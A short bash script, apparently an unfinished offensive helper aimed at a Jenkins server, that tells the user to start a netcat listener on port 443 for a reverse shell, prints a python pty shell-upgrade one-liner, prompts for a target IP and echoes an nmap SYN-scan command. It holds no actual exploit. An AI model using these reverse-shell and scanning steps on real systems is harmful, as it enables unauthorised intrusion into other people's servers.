#! /bin/bash 

echo
echo "*******************************************************************"
echo
echo "Open another terminal window and run a netcat listener: nc -lvp 443"
echo
echo "Run the following command  to spawn a shell once the reverse connection establishes:"
echo 
echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" 
echo
read -n 1 -s -r -p "Once the above is complete - press any key to continue"

echo
echo "Enter Jenkins Target IP Address"
echo

read target

echo "nmap -sS -oN results_portscan.txt $target" 

echo "Executing scan..."
echo

echo "pwn"

